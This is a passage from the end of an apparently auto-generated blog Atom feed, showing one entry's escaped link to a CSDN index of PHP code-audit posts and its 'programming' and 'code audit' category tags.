&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/mdeditor/81107149&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP 代码审计博客目录&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
